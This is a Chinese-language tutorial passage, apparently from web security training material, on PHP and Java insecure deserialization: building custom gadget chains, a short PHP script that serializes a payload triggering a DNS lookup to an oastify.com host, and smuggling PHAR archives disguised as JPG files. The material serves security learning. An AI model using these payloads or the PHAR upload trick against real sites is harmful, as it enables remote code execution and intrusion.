## 创建自己的漏洞利用

当现成的 gadget 链和已记录的漏洞利用不成功时，您将需要创建自己的漏洞利用。

要成功构建自己的 gadget 链，几乎肯定需要源代码访问权限。第一步是研究此源代码，以识别包含在反序列化期间调用的魔术方法的类。评估此魔术方法执行的代码，看它是否直接对用户可控属性执行任何危险操作。以防万一，这始终值得检查。

如果魔术方法本身不可利用，它可以作为 gadget 链的“kick-off gadget”。研究 kick-off gadget 调用的任何方法。其中是否有任何方法对您控制的数据执行危险操作？如果没有，请仔细观察它们随后调用的每个方法，依此类推。

重复此过程，跟踪您可以访问的值，直到您到达死胡同或识别出将可控数据传递到的危险 sink gadget。

一旦您弄清楚如何成功地在应用程序代码中构建 gadget 链，下一步就是创建包含您的载荷的序列化对象。这只是研究源代码中的类声明并创建具有漏洞利用所需适当值的有效序列化对象的问题。正如我们在之前的实验中所看到的，处理基于字符串的序列化格式时，这相对简单。

处理二进制格式（例如构建 Java 反序列化漏洞利用）可能特别麻烦。当对现有对象进行微小更改时，您可能习惯于直接处理字节。但是，当进行更重大的更改（例如传入完全新的对象）时，这将很快变得不切实际。通常，用目标语言编写自己的代码以自行生成和序列化数据要简单得多。

在创建自己的 gadget 链时，留意利用此额外攻击面触发二次漏洞的机会。

通过仔细研究源代码，您可以发现更长的 gadget 链，潜在地允许您构建高严重性攻击，通常包括远程代码执行。

php 示例模板
```php
#!/usr/bin/env php
<?php
class target_obj {
    private $a;
    public function __construct($cb_func)
    {
        $this->a = $cb_func;
    }
}

class set_obj {

    private $b;
    private $c;

    public function __construct($cb_func, $cb_arg)
    {
        // 设置回调函数
        $this->c = new target_obj($cb_func);
        // 设置用于回调函数的参数
        $this->b = $cb_arg;
    }
}

print rawurlencode(base64_encode(serialize(new set_obj('gethostbynamel', 'id.oastify.com'))));
?>
```

编程语言代码注入时，直接调用函数，或运行 `exec(字符串)` 以不受参数限制而直接执行字符串系统命令

## PHAR 隐式反序列化

到目前为止，我们主要研究了网站显式反序列化用户输入时的反序列化漏洞利用。但是，在 PHP 中，即使没有明显使用 `unserialize()` 方法，有时也可能利用隐式反序列化。

PHP 提供了几个 URL 风格的包装器，可用于在处理文件路径时处理不同协议。其中之一是 `phar://` 包装器，它为访问 PHP 存档（`.phar`）文件提供流接口。

PHP 文档显示，`PHAR` 清单文件包含**序列化的元数据**。关键的是，如果您对 `phar://` 流执行任何**文件系统操作**，此元数据将被**隐式反序列化**。这意味着，只要您可以将此流传递给文件系统方法，`phar://` 流就可能成为利用不安全反序列化的向量。

对于明显危险的文件系统方法（如 `include()` 或 `fopen()`），网站可能已实施对策以减少被恶意使用的可能性。但是，诸如 `file_exists()` 之类不太明显危险的方法可能不会受到同等保护。

此技术还要求您以某种方式将 `PHAR` 上传到服务器。一种方法是使用图像上传功能，例如。如果您能够创建一个混合文件，将 `PHAR` 伪装成简单的 `JPG`，有时可以绕过网站的验证检查。如果您随后能强制网站从 `phar://` 流加载此混合“`JPG`”，则通过 `PHAR` 元数据注入的任何有害数据都将被反序列化。由于 PHP 读取流时不检查文件扩展名，文件使用图像扩展名无关紧要。

只要对象的类受网站支持，`__wakeup()` 和 `__destruct()` 魔术方法都可以通过这种方式调用，允许您使用此技术启动 gadget 链。

这种创新技术曾出现在我们的 2018 年十大 Web 黑客技术中。
